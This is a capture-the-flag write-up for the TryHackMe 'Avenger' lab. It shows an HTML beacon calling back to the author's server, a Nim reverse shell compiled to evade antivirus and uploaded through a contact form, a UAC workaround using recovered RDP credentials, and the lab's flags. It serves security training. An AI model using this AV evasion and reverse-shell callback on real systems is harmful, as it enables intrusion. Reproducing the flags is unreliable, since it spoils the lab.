If we visit the web application, we can find this:

![Pasted image 20250718172139.png](../../IMAGES/Pasted%20image%2020250718172139.png)

We can see some folders being hosted on here, if we try to go to `gift`, we get redirected to `avenger.tryhackme`, we need to add this to `/etc/hosts`:

```bash
echo '10.10.5.109 avenger.tryhackme' | sudo tee -a /etc/hosts
```

This is a WordPress page, we can now this by doing a ffuf scan or using Wappalyzer:

If we search for an exploit regarding this version, we find this:

![Pasted image 20250718172208.png](../../IMAGES/Pasted%20image%2020250718172208.png)

We find some race conditions and a PoC script for unarbitrary file upload, let's check this one:

https://github.com/E1A/CVE-2023-4596

![Pasted image 20250718172226.png](../../IMAGES/Pasted%20image%2020250718172226.png)


We need some place to upload files, we can find it down below:

![Pasted image 20250718172231.png](../../IMAGES/Pasted%20image%2020250718172231.png)


Let's proceed with exploitation.



# EXPLOITATION
---

If we upload a simple file, we can see this:


![Pasted image 20250718172236.png](../../IMAGES/Pasted%20image%2020250718172236.png)

It says the team is reviewing the message carefully, we can create a simple html file which points to a server we create with python, so we can check if someone makes a request to our server:

```
echo '<img src="http://10.14.21.28:8000/test">' > server.html
```

![Pasted image 20250718172241.png](../../IMAGES/Pasted%20image%2020250718172241.png)


Once we send the message, if we check the python server, we see a connection being made:

![Pasted image 20250718172247.png](../../IMAGES/Pasted%20image%2020250718172247.png)

There's no need to use the previous PoC, we can simply craft a malicious file which will retrieve a reverse shell, there's no blacklisting for extensions so we can use any we like.

Here's where the tricky part comes in, AV is enabled and if we try uploading and executing a simple revshell, it won't trigger due to the AV.

So, we need some sort of way to bypass the AV, there are a ton of ways to bypass this, we can use Go, Powercat and other techniques, I came across a very interesting one which involved `nim`:

https://starlox.medium.com/windows-av-bypass-to-reverse-shell-2578527d8342

![Pasted image 20250718172255.png](../../IMAGES/Pasted%20image%2020250718172255.png)

I'll switch to my kali machine to make this easier, let's start by cloning the repo and installing nim:

```
https://github.com/Sn1r/Nim-Reverse-Shell
```

```
sudo apt install nim
```

We need to change the IP and PORT inside of the `rev_shell.nim` file;

![Pasted image 20250718172429.png](../../IMAGES/Pasted%20image%2020250718172429.png)

Now, we need to compile the file;

```
nim c -d:mingw --app:gui rev_shell.nim
```

We'll receive a `.exe` file:


![Pasted image 20250718172435.png](../../IMAGES/Pasted%20image%2020250718172435.png)

We can simply upload the `.exe` and this will happen:

![Pasted image 20250718172439.png](../../IMAGES/Pasted%20image%2020250718172439.png)


Let's begin privilege escalation.



# PRIVILEGE ESCALATION

If we check our groups, we can notice we are part of administrators:

```powershell
C:\Windows\system32> whoami /groups

Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
```

The issue is that UAC stop us from getting the shell from the `Administrator` desktop, we can see we got `Medium Mandatory level`, we need a way to get `HIGH Il`.

There are tons of ways to bypass the UAC and get a shell without these restrictions, we can use `fodhelper` bypass, create a evil dll, use runascs and many more.

For this machine, we can use another unintended way which is to retrieve the hidden credentials for the `hugo` user and log in using `xfreerdp` or remmina, we can find the credentials here:

```powershell

```

As seen, we got the credentials for hugo:

```
hugo:SurpriseMF123!
```

Let's go into `xfreerdp`:

```
xfreerdp3 /u:hugo /p:SurpriseMF123! /v:10.10.143.9 /cert:ignore +clipboard /dynamic-resolution
```

![Pasted image 20250718172447.png](../../IMAGES/Pasted%20image%2020250718172447.png)

We can see our root file here, if we go to the administrator desktop, a UAC will appear, we simply click continue:

![Pasted image 20250718172450.png](../../IMAGES/Pasted%20image%2020250718172450.png)

And then we can finally read root flag:

![Pasted image 20250718172453.png](../../IMAGES/Pasted%20image%2020250718172453.png)

Let's get both flags and end the CTF:

```
THM{WITH_GREAT_POWER_COMES_GREAT_RESPONSIBILITY}

THM{I_CAN_DO_THIS_ALL_DAY}
```

# DISCLAIMER
---

The Nim reverse shell isn't that stable in reality, I only used it to showcase another path you can take, you cannot perform most of the actions such as opening Powershell and other stuff inside of this shell (Or atleast I tried and couldn't do it, you can always try a way to do this).

You can always try another path to get a reverse shell such as using `powercat` and you will get  a more stable shell, still, the PE path on this writeup works but there's another PE paths such as getting a shell through `fodhelper`, injecting an evil dll and many more you can find online.
